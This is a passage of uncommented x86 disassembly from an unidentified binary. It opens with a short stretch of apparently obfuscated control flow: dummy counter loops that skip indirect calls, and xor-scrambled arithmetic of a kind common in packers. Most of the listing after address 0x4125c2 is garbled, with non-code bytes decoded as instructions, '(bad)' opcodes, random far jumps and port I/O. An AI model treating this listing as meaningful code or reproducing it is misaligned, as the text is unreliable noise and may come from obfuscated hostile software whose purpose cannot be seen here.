  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x430a20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x430a24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x430a28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x2d907a6a
  4125d0:	cmp    ebp,DWORD PTR [eax+ebx*1+0x73]
  4125d4:	jnp    0x412651
  4125d6:	mov    cl,0x9c
  4125d8:	jnp    0x412655
  4125da:	cdq    
  4125db:	loope  0x4125dc
  4125dd:	sbb    esi,DWORD PTR [eax-0x3e3cae4d]
  4125e3:	imul   ecx,DWORD PTR [ebx*4+0x10581d59],0xe2437236
  4125ee:	retf   
  4125ef:	(bad)  [ebx]
  4125f1:	or     BYTE PTR [edx-0x46],al
  4125f4:	popf   
  4125f5:	jae    0x55cf4a63
  4125fb:	out    dx,eax
  4125fc:	je     0x412637
  4125fe:	outs   dx,DWORD PTR ds:[esi]
  4125ff:	push   0x76
  412601:	mov    eax,0x291405f8
  412606:	out    0x9b,al
  412608:	cmp    BYTE PTR [esi],dl
  41260a:	mov    esi,DWORD PTR [edi]
  41260c:	les    edx,FWORD PTR [edi]
  41260e:	cli    
  41260f:	ins    DWORD PTR es:[edi],dx
  412610:	imul   edi,eax,0xa15a0310
  412616:	les    eax,FWORD PTR [edx+0x1c8cf957]
  41261c:	and    DWORD PTR [edi+0x79],ebx
  41261f:	and    BYTE PTR [edi+ecx*2],cl
  412622:	cmc    
  412623:	cs into 
  412625:	adc    eax,0x5a822a27
  41262a:	inc    ebp
  41262b:	test   al,0x45
  41262d:	pop    ds
  41262e:	push   ds
  41262f:	jmp    0x412656
  412631:	imul   eax,ebp,0x7a8cf057
  412637:	jmp    0x412685
  412639:	inc    eax
  41263a:	les    ebx,FWORD PTR [ebp+eiz*2+0x2a]
  41263e:	test   eax,0xd0ccc1cd
  412643:	xor    BYTE PTR [ecx-0x7e977e04],0x64
  41264a:	fmul   QWORD PTR [edi]
  41264c:	fisub  DWORD PTR [ebx]
  41264e:	mov    al,0x53
  412650:	pop    es
  412651:	sar    BYTE PTR [esi],cl
  412653:	int    0xf8
  412655:	loop   0x412664
  412657:	cs pop esi
  412659:	test   eax,0xd44e0e21
  41265e:	ret    0xf634
  412661:	(bad)  
  412662:	leave  
  412663:	shl    al,1
  412665:	or     BYTE PTR [esi+edi*4-0x6d],cl
  412669:	test   eax,0xa4e35aa6
  41266e:	mov    cl,BYTE PTR [ecx]
  412670:	ror    DWORD PTR [eax-0x26184f1d],0x9d
  412677:	daa    
  412678:	adc    BYTE PTR [eax-0x1f],dh
  41267b:	cdq    
  41267c:	aad    0xa8
  41267e:	dec    esi
  41267f:	jne    0x4126b8
  412681:	stc    
  412682:	cmp    bl,BYTE PTR [ebp+0x34]
  412685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412686:	std    
  412687:	mov    ecx,0xbb415490
  41268c:	test   DWORD PTR [ebx+0x7efc7be9],0x3b9aaf53
  412696:	jg     0x41261b
  412698:	fst    DWORD PTR [edi-0x47]
  41269b:	mov    ds:0x6e46fa52,eax
  4126a0:	sbb    eax,0xf2ceb13b
  4126a5:	shld   ebx,ebp,cl
  4126a8:	cmp    BYTE PTR [ebp-0x38],cl
  4126ab:	aas    
  4126ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126ad:	out    dx,eax
  4126ae:	push   ss
  4126af:	inc    esi
  4126b0:	test   eax,0x80e74054
  4126b5:	icebp  
  4126b6:	rcl    DWORD PTR [ebp-0x2f],1
  4126b9:	push   ebp
  4126ba:	inc    ebp
  4126bb:	daa    
  4126bc:	mov    ebx,0xd17aaaeb
  4126c1:	inc    ebp
  4126c2:	daa    
  4126c3:	rcr    BYTE PTR [edi],1
  4126c5:	mov    ebx,0x878ea279
  4126ca:	out    0xe4,al
  4126cc:	push   esp
  4126cd:	xchg   edi,eax
  4126ce:	lahf   
  4126cf:	into   
  4126d0:	cmp    BYTE PTR [eax],ch
  4126d2:	cmc    
  4126d3:	fidivr WORD PTR [eax-0x1c]
  4126d6:	pusha  
  4126d7:	push   0xffffffa0
  4126d9:	std    
  4126da:	loopne 0x4126e4
  4126dc:	outs   dx,BYTE PTR ds:[esi]
  4126dd:	jle    0x412706
  4126df:	or     ah,BYTE PTR [ebx+0x4b]
  4126e2:	jmp    0x412740
  4126e4:	push   0xb3c83dc2
  4126e9:	adc    ch,0x3d
  4126ec:	js     0x4126bd
  4126ee:	xchg   bh,bl
  4126f0:	div    BYTE PTR [edx-0x298684d6]
  4126f6:	mov    ch,0x5f
  4126f8:	jp     0x412725
  4126fa:	xlat   BYTE PTR ds:[ebx]
  4126fb:	dec    ebp
  4126fc:	cmp    cl,BYTE PTR [eax]
  4126fe:	xchg   dl,ah
  412700:	add    al,0xe1
  412702:	xor    eax,0x51a408d7
  412707:	test   BYTE PTR [ebx+0x7a6349dc],ch
  41270d:	jno    0x41274d
  41270f:	aas    
  412710:	bound  edx,QWORD PTR [ecx+ecx*8+0x6d]
  412714:	xchg   BYTE PTR [ecx+0x3661a7b4],al
  41271a:	sub    DWORD PTR [edi],ecx
  41271c:	mov    eax,0x2fc98b4c
  412721:	leave  
  412722:	jle    0x4126ef
  412724:	inc    ebp
  412725:	dec    esi
  412726:	scas   eax,DWORD PTR es:[edi]
  412727:	push   ecx
  412728:	push   eax
  412729:	or     eax,0x9530601d
  41272e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41272f:	cmc    
  412730:	mov    BYTE PTR [esi+0x50],dl
  412733:	jne    0x412744
  412735:	cs dec eax
  412737:	je     0x41271a
  412739:	or     ebx,eax
  41273b:	sbb    al,0x22
  41273d:	pusha  
  41273e:	adc    al,0xd7
  412740:	ror    BYTE PTR [esi],cl
  412742:	int3   
  412743:	add    eax,0xd6aab16
  412748:	nop
  412749:	and    ebx,DWORD PTR [edi]
  41274b:	lea    esp,[ebp-0x45bd19b2]
  412751:	ret    
  412752:	aam    0xf9
  412754:	push   cs
  412755:	pop    esp
  412756:	push   ebx
  412757:	out    dx,al
  412758:	mov    ebp,0x8c114ade
  41275d:	inc    ecx
  41275e:	mov    ah,0x80
  412760:	sbb    eax,0xf79ea7cc
  412765:	and    ah,BYTE PTR [ebx+0x36d8326b]
  41276b:	call   0x9fc2:0x8cd69883
  412772:	ret    0x6112
  412775:	sbb    DWORD PTR [ebx-0x4f],edx
  412778:	ficom  WORD PTR [edi]
  41277a:	leave  
  41277b:	imul   esi,DWORD PTR [ebp+0x11],0xfffffff6
  41277f:	or     al,0xd
  412781:	pop    ebp
  412782:	fwait
  412783:	outs   dx,BYTE PTR ds:[esi]
  412784:	push   ebp
  412785:	scas   al,BYTE PTR es:[edi]
  412786:	adc    al,0x22
  412788:	or     ebx,esp
  41278a:	je     0x41279e
  41278c:	add    ebp,DWORD PTR ds:0x59201f38
  412792:	inc    edi
  412793:	stos   BYTE PTR es:[edi],al
  412794:	and    bh,cl
  412796:	push   esp
  412797:	loopne 0x4127cc
  412799:	mov    al,BYTE PTR [ecx+0x2f2eedab]
  41279f:	sbb    bl,BYTE PTR [edx-0x48]
  4127a2:	arpl   WORD PTR cs:[edi+0x14],sp
  4127a6:	ror    bh,cl
  4127a8:	mov    dl,0x5a
  4127aa:	pop    ss
  4127ab:	sbb    edi,DWORD PTR ss:[edi-0x72]
  4127af:	inc    ecx
  4127b0:	push   esp
  4127b1:	sbb    eax,edi
  4127b3:	jno    0x412815
  4127b5:	jmp    0xbc4e84c9
  4127ba:	inc    esi
  4127bb:	out    dx,al
  4127bc:	add    ebp,DWORD PTR es:[edx]
  4127bf:	jbe    0x41274e
  4127c1:	jg     0x412796
  4127c3:	xchg   DWORD PTR [ebp-0x7],esi
  4127c6:	adc    DWORD PTR [ebx+eiz*4-0x3e534f57],edi
  4127cd:	jbe    0x412817
  4127cf:	call   0xb337:0x83fdbc5a
  4127d6:	dec    dl
  4127d8:	mov    ebp,0x672ea578
  4127dd:	add    dh,BYTE PTR [edx]
  4127df:	jmp    0x4a91:0xffa211f0
  4127e6:	mov    edi,ecx
  4127e8:	push   edi
  4127e9:	dec    edi
  4127ea:	jecxz  0x41278b
  4127ec:	rcl    DWORD PTR [edx+0x7c],1
  4127ef:	imul   edx
  4127f1:	(bad)  
  4127f2:	retf   0xc961
  4127f5:	jbe    0x4127bb
  4127f7:	mov    ebp,0xe29b73a4
  4127fc:	lods   al,BYTE PTR ds:[esi]
  4127fd:	cmc    
  4127fe:	loope  0x412798
  412800:	lods   al,BYTE PTR ds:[esi]
  412801:	mov    eax,ds:0x71aa55f8
  412806:	cdq    
  412807:	add    BYTE PTR ss:[ebp+eiz*8-0x7cb49c40],bl
  41280f:	jo     0x412883
  412811:	cld    
  412812:	pop    ecx
  412813:	clc    
  412814:	lea    esp,[eax-0x7eedaee4]
  41281a:	sbb    eax,DWORD PTR [ebp+0x5a]
  41281d:	push   0xfffffff6
  41281f:	(bad)  
  412820:	fld    TBYTE PTR [edi-0x3b511a58]
  412826:	cdq    
  412827:	mov    bh,0x8f
  412829:	cmc    
  41282a:	popa   
  41282b:	mov    ecx,0xcf559c10
  412830:	mov    ebx,0xa1fbfac1
  412835:	mov    eax,ds:0xf490c2b4
  41283a:	int3   
  41283b:	pop    eax
  41283c:	repnz sar DWORD PTR [ebp+0x6d],cl
  412840:	cld    
  412841:	lea    esp,[esi+0x25]
  412844:	fwait
  412845:	sar    DWORD PTR [edi+0x4ba5ded],0xa5
  41284c:	bound  ecx,QWORD PTR [esi+0x519321e7]
  412852:	mov    ebx,0x33202386
  412857:	arpl   si,di
  412859:	bound  ebx,QWORD PTR [ebx+0x651d970a]
  41285f:	and    edx,DWORD PTR [ebx+0x7c12285d]
  412865:	(bad)  
  412866:	push   edi
  412867:	icebp  
  412868:	adc    al,0xac
  41286a:	xor    al,BYTE PTR [edi-0x50]
  41286d:	fmul   DWORD PTR [ebp+eax*2-0x5]
  412871:	jl     0x412868
  412873:	inc    edx
  412874:	add    BYTE PTR [ebx-0x31],dl
  412877:	sbb    eax,0xf3acdb94
  41287c:	fs popf 
  41287e:	pop    esp
  41287f:	loope  0x4128f8
  412881:	mov    DWORD PTR [edx],0xdb1d6fa8
  412887:	ins    BYTE PTR es:[edi],dx
  412888:	retf   
  412889:	rol    eax,0x5
  41288c:	mov    cl,0x64
  41288e:	data16 sub BYTE PTR [ecx-0x1c1d6b08],cl
  412895:	into   
  412896:	sub    dh,BYTE PTR ds:0x7d76a690
  41289c:	inc    ecx
  41289d:	push   eax
  41289e:	cmp    DWORD PTR [edi+0x72],eax
  4128a1:	icebp  
  4128a2:	lods   eax,DWORD PTR ds:[esi]
  4128a3:	icebp  
  4128a4:	push   ss
  4128a5:	call   0x3d1b92ad
  4128aa:	cmp    edi,ebx
  4128ac:	ds mov esi,0xb7840fa7
  4128b2:	push   ss
  4128b3:	nop
  4128b4:	mov    ah,0x4
  4128b6:	jne    0x412846
  4128b8:	xchg   ebx,eax
  4128b9:	push   edi
  4128ba:	nop
  4128bb:	cli    
  4128bc:	mov    esp,0xaba814b5
  4128c1:	xor    ah,BYTE PTR [edx-0xf]
  4128c4:	lods   al,BYTE PTR ds:[esi]
  4128c5:	dec    esi
  4128c6:	mov    edx,0x8ceaca28
  4128cb:	sub    al,0x5e
  4128cd:	dec    edx
  4128ce:	mov    ecx,0x8982d6a2
  4128d3:	shl    DWORD PTR [eax-0x7a],1
  4128d6:	or     cl,BYTE PTR [esi-0x602dd751]
  4128dc:	jb     0x4128eb
  4128de:	loop   0x412878
  4128e0:	lods   eax,DWORD PTR ds:[esi]
  4128e1:	outs   dx,DWORD PTR ds:[esi]
  4128e2:	add    esp,DWORD PTR [edx-0x3a]
  4128e5:	cmp    dl,BYTE PTR [esp+edi*8+0x20728838]
  4128ec:	mov    eax,fs:0xc1f1e533
  4128f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128f3:	cmp    eax,0x7478479b
  4128f8:	repz push es
  4128fa:	sbb    al,0x31
  4128fc:	arpl   WORD PTR [ecx],bp
  4128fe:	pushf  
  4128ff:	jp     0x412958
  412901:	mov    ebx,0x90795361
  412906:	sbb    edx,DWORD PTR [ebp+0xc]
  412909:	das    
  41290a:	xor    ch,BYTE PTR [edx+0x7c7fc13f]
  412910:	lahf   
  412911:	inc    esi
  412912:	mov    gs,WORD PTR [ecx-0x18]
  412915:	jae    0x41295a
  412917:	jl     0x412955
  412919:	pop    ebp
  41291a:	cmp    esp,DWORD PTR [eax-0x6e]
  41291d:	or     al,0xed
  41291f:	pop    ss
  412920:	in     eax,dx
  412921:	ins    BYTE PTR es:[edi],dx
  412922:	adc    ebp,ebp
  412924:	mov    esp,0x637e396b
  412929:	add    al,0xfe
  41292b:	add    DWORD PTR [ecx+0x42],edi
  41292e:	lock pause 
  412931:	cmp    bh,BYTE PTR [edi+0x6b]
  412934:	and    edx,DWORD PTR [ebp+eax*2-0x440aa017]
  41293b:	jae    0x412918
  41293d:	adc    esi,ecx
  41293f:	iret   
  412940:	cwde   
  412941:	imul   esi,DWORD PTR ds:0xed676753,0x43fbfe26
  41294b:	pop    ebp
  41294c:	test   DWORD PTR [edx+0x653680b7],ebx
  412952:	ds pop ss
  412954:	pop    esi
  412955:	mov    ds:0x306b34,al
  41295a:	lock mov eax,ds:0x674cd1a9
  412960:	adc    al,0xbd
  412962:	jge    0x41296e
  412964:	mov    eax,esp
  412966:	(bad)
  41296b:	cmp    al,0xc6
  41296d:	add    edx,edx
  41296f:	stc    
  412970:	xchg   edi,eax
  412971:	push   ebp
  412972:	mov    dl,0xad
  412974:	in     eax,dx
  412975:	cmp    DWORD PTR [eax],esp
  412977:	addr16 test eax,0xb843a043
  41297d:	mov    cs,WORD PTR [esi-0x42]
  412980:	pop    ebx
  412982:	add    bl,bl
  412984:	mov    cl,0x48
  412986:	pop    ss
  412987:	les    ecx,FWORD PTR [ebp+0x4e29ad0]
  41298d:	add    BYTE PTR [ecx+0x41db0b75],bl
  412993:	push   ds
  412994:	ret    0x879
  412997:	xchg   esi,eax
  412998:	dec    eax
  412999:	fadd   st,st(4)
  41299b:	inc    ecx
  41299c:	xor    DWORD PTR [esi],0x1f6a8e57
  4129a2:	or     esi,ecx
  4129a4:	xchg   esi,eax
  4129a5:	sub    DWORD PTR ds:0x2f70b0f3,0x24
  4129ac:	lea    ecx,[ebx-0x6e0fe113]
  4129b2:	out    dx,eax
  4129b3:	mov    ebp,0x1ef02907
  4129b8:	jge    0x4129b4
  4129ba:	aas    
  4129bb:	add    ebp,DWORD PTR [edx-0x38457a08]
  4129c1:	sti    
  4129c2:	push   ss
  4129c3:	add    DWORD PTR [edi],edx
  4129c5:	push   cs
  4129c6:	je     0x412988
  4129c8:	jecxz  0x4129c3
  4129ca:	pop    edi
  4129cb:	rcr    BYTE PTR [ecx-0x178120e3],cl
  4129d1:	xor    al,al
  4129d3:	mov    al,ds:0x1ee9f8af
  4129d8:	aad    0x5d
  4129da:	pop    ds
  4129db:	cli    
  4129dc:	pop    eax
  4129dd:	arpl   WORD PTR [ecx+0x5b],si
  4129e0:	jo     0x412a0d
  4129e2:	shl    DWORD PTR ds:[ebp+ebp*8-0x1ef7ebc0],cl
  4129ea:	and    dh,0x74
  4129ed:	jno    0x4129ec
  4129ef:	cwde   
  4129f0:	inc    edx
  4129f1:	cmp    DWORD PTR [eax-0x1c],edi
  4129f4:	fmul   DWORD PTR [ebx]
  4129f6:	xchg   esi,eax
  4129f7:	(bad)  
  4129f8:	push   edi
  4129f9:	push   edi
  4129fa:	pop    esi
  4129fb:	hlt    
  4129fc:	push   0x1f847bbf
  412a01:	loopne 0x412984
  412a03:	add    BYTE PTR [eax],cl
  412a05:	and    esi,DWORD PTR [ecx]
  412a07:	not    edx
  412a09:	mov    al,ds:0x9b37926b
  412a0e:	xor    ah,BYTE PTR [eax-0x56]
  412a11:	adc    al,0x80
  412a13:	adc    eax,0x8598f99b
  412a18:	out    dx,eax
  412a19:	jmp    0x417a:0x27262bb1
  412a20:	mov    cl,0x5f
  412a22:	mov    al,0xc5
  412a24:	(bad)  
  412a25:	nop
  412a26:	adc    al,0x70
  412a28:	sbb    eax,0x555ebf1c
  412a2d:	mov    bh,0x45
  412a2f:	pop    esi
  412a30:	inc    ebx
  412a31:	pop    ds
  412a32:	enter  0xfebe,0xa6
  412a36:	pusha  
  412a37:	add    DWORD PTR [ecx+0x1114b039],ecx
  412a3d:	cmc    
  412a3e:	(bad)  
  412a3f:	xchg   ecx,eax
  412a40:	or     ecx,DWORD PTR [ecx+eiz*2-0x5f77a444]
  412a47:	xchg   esp,eax
  412a48:	jnp    0x412a6b
  412a4a:	push   cs
  412a4b:	(bad)  
  412a4c:	push   DWORD PTR [ebp+0x25]
  412a4f:	test   BYTE PTR [edi-0x4da3a62a],al
  412a55:	pop    esi
  412a56:	dec    esp
  412a57:	adc    BYTE PTR [eax+0x3b],0xef
  412a5b:	or     eax,0x17785e7
  412a60:	jne    0x412a25
  412a62:	add    edi,ebp
  412a64:	adc    eax,0x24c7b22c
  412a69:	call   0x3cc0d58
  412a6e:	push   esp
  412a6f:	fild   DWORD PTR [ecx-0x55]
  412a72:	jb     0x412a3a
  412a74:	sub    ebp,DWORD PTR [esi+0x1b]
  412a77:	int3   
  412a78:	out    0x64,eax
  412a7a:	jns    0x412a8e
  412a7c:	in     eax,dx
  412a7d:	and    DWORD PTR [ebx+0x7eb6a5b4],eax
  412a83:	pop    edx
  412a84:	loopne 0x412ac6
  412a86:	cmp    esp,0x694405d1
  412a8c:	xor    BYTE PTR [ecx],0xb9
  412a8f:	xchg   BYTE PTR [edx+0x2163ea29],ch
  412a95:	xchg   edx,eax
  412a96:	retf   
  412a97:	imul   edi,DWORD PTR [edi+esi*8+0x7d2ef624],0xdd823c96
  412aa2:	pop    esp
  412aa3:	add    BYTE PTR [ebp+0x3d],0x26
  412aa7:	fistp  DWORD PTR [ecx+0x2d3fc1cf]
  412aad:	in     al,dx
  412aae:	loop   0x412a6f
  412ab0:	aas    
  412ab1:	retf   
  412ab2:	mov    ebx,0x6137b38a
  412ab7:	pop    es
  412ab8:	(bad)  
  412aba:	adc    edi,DWORD PTR ds:0xe75f06c9
  412ac0:	fs or  al,0x65
  412ac3:	je     0x412b34
  412ac5:	push   ebp
  412ac6:	int    0x4a
  412ac8:	lea    esp,[edx+edx*1]
  412acb:	in     al,dx
  412acc:	(bad)  
  412acd:	rcl    BYTE PTR [edx-0x4d5d2e8d],0x87
  412ad4:	adc    eax,DWORD PTR [edx]
  412ad6:	inc    ah
  412ad8:	mov    bh,0xe9
  412ada:	jl     0x412b49
  412adc:	sbb    BYTE PTR [eax-0x27],bh
  412adf:	lods   eax,DWORD PTR ds:[esi]
  412ae0:	mov    edi,0x635cc858
  412ae5:	(bad)  
  412ae6:	out    dx,al
  412ae7:	mov    DWORD PTR [eax-0x42],esp
  412aea:	mov    gs,WORD PTR [edx+0x3d502ccb]
  412af0:	cmp    bl,0xf9
  412af3:	xchg   ecx,eax
  412af4:	jb     0x412af5
  412af6:	pop    ds
  412af7:	mov    ebx,0xc49bebdb
  412afc:	enter  0xd7b3,0x9d
  412b00:	xchg   edx,eax
  412b01:	daa    
  412b02:	cdq    
  412b03:	xchg   edx,eax
  412b04:	and    eax,ebx
  412b06:	add    bl,BYTE PTR ds:0xecab9f
  412b0c:	jmp    0xa8bf90c9
  412b11:	into   
  412b12:	repz cmc 
  412b14:	mov    al,0xf9
  412b16:	aam    0xbf
  412b18:	jb     0x412b6c
  412b1a:	mov    ebx,0xd012ba44
  412b1f:	dec    esp
  412b20:	lods   eax,DWORD PTR ds:[esi]
  412b21:	mov    ebp,0xe76a2684
  412b26:	jmp    0xe0113a97
  412b2b:	ss pop es
  412b2d:	add    DWORD PTR [edx],esp
  412b2f:	bound  ebp,QWORD PTR [ecx+0x15]
  412b32:	cwde   
  412b33:	cmp    WORD PTR [edi+0x52],si
  412b37:	out    dx,al
  412b38:	cld    
  412b39:	int3   
  412b3a:	enter  0xde57,0x9f
  412b3e:	xchg   esp,eax
  412b3f:	mov    cl,0x7b
  412b41:	push   eax
  412b42:	pop    es
  412b43:	sbb    ecx,esp
  412b45:	xchg   ebx,eax
  412b46:	test   eax,0x640e38ec
  412b4c:	outs   dx,BYTE PTR ds:[esi]
  412b4d:	sub    eax,0x774cf436
  412b52:	in     eax,0xa5
  412b54:	mov    al,ds:0x7983665c
  412b59:	ss stos DWORD PTR es:[edi],eax
  412b5b:	jmp    0x7e758659
  412b60:	dec    esi
  412b61:	xchg   esi,eax
  412b62:	sbb    dl,BYTE PTR es:[edi+0x21]
  412b66:	xchg   ecx,eax
  412b67:	enter  0x7230,0xc2
  412b6b:	jbe    0x412be7
  412b6d:	dec    ecx
  412b6e:	inc    edx
  412b6f:	or     DWORD PTR [esi+0x52],0x4c
  412b73:	sti    
  412b74:	int3   
  412b75:	adc    eax,0xa2aabecf
  412b7a:	adc    al,0x66
  412b7c:	repnz int 0xef
  412b7f:	xchg   bl,ah
  412b81:	and    BYTE PTR [edi],bl
  412b83:	scas   al,BYTE PTR es:[edi]
  412b84:	sub    DWORD PTR [esi],0xf8421f37
  412b8a:	out    dx,al
  412b8b:	hlt    
  412b8c:	or     edi,ecx
  412b8e:	das    
  412b8f:	pop    ebx
  412b90:	push   ecx
  412b91:	das    
  412b92:	in     al,0xd7
  412b94:	(bad)  
  412b95:	int    0x1
  412b97:	into   
  412b98:	jmp    0x3dae:0x8a5a1b42
  412b9f:	dec    edx
  412ba0:	mov    WORD PTR [edx],fs
  412ba2:	lods   eax,DWORD PTR ds:[esi]
  412ba3:	push   esp
  412ba4:	push   ebx
  412ba5:	or     edx,DWORD PTR [esi]
  412ba7:	mov    ds:0xe3e21f8d,al
  412bac:	lods   al,BYTE PTR ds:[esi]
  412bad:	div    DWORD PTR [edx-0x18]
  412bb0:	dec    ebp
  412bb1:	addr16 mov bh,0xaf
  412bb4:	mov    esi,0x25e8d0fb
  412bb9:	shl    edi,1
  412bbb:	scas   al,BYTE PTR es:[edi]
  412bbc:	dec    edi
  412bbd:	retf   
  412bbe:	popa   
  412bbf:	add    dl,BYTE PTR [eax+0x77]
  412bc2:	sbb    eax,0xba865d56
  412bc7:	push   0x228e2355
  412bcc:	mov    ah,0xed
  412bce:	aaa    
  412bcf:	pop    ebp
  412bd0:	(bad)
  412bd3:	repnz pop edx
  412bd5:	sbb    al,0xbf
  412bd7:	xor    ecx,ebx
  412bd9:	ret    0x5bb4
  412bdc:	call   0x63d89ca0
  412be1:	mov    al,ds:0x525c6a84
  412be6:	es cld 
  412be8:	cdq    
  412be9:	lahf   
  412bea:	test   al,0x8b
  412bec:	dec    ecx
  412bed:	mov    edi,0x83276027
  412bf2:	dec    ecx
  412bf3:	(bad)  
  412bf4:	(bad)  
  412bf5:	adc    ebp,esi
  412bf7:	sar    BYTE PTR [esi+ebx*4+0x46],1
  412bfb:	das    
  412bfc:	repz mov dl,0xba
  412bff:	dec    esp
  412c00:	xchg   esi,eax
  412c01:	daa    
  412c02:	into   
  412c03:	fist   WORD PTR [ebp+0x30]
  412c06:	cmp    al,0x11
  412c08:	pusha  
  412c09:	cmc    
  412c0a:	mov    eax,ds:0x80e2659f
  412c0f:	test   BYTE PTR ds:0xa353c5d1,0xb2
  412c16:	fild   WORD PTR [eax]
  412c18:	mov    DWORD PTR [edi],0x6ba9bc66
  412c1e:	mov    al,BYTE PTR [ebp-0x44]
  412c21:	imul   ebp,DWORD PTR ds:0xc0cc7f53,0xffffff8d
  412c28:	test   dl,0x9b
  412c2b:	sub    ch,al
  412c2d:	sbb    DWORD PTR [eax],0xe2782e75
  412c33:	ja     0x412ca7
  412c35:	popf   
  412c36:	pushf  
  412c37:	dec    eax
  412c38:	push   0xe5812338
  412c3d:	imul   ecx,ecx,0xfffffffe
  412c40:	sbb    BYTE PTR [ecx-0x66ff7a08],0xc9
  412c47:	lods   eax,DWORD PTR ds:[esi]
  412c48:	(bad)  
  412c49:	cld    
  412c4a:	clc    
  412c4b:	leave  
  412c4c:	js     0x412bd4
  412c4e:	inc    edx
  412c4f:	sbb    al,0xef
  412c51:	std    
  412c52:	cs push es
  412c54:	cmp    bl,BYTE PTR [ebx+0x77bb088d]
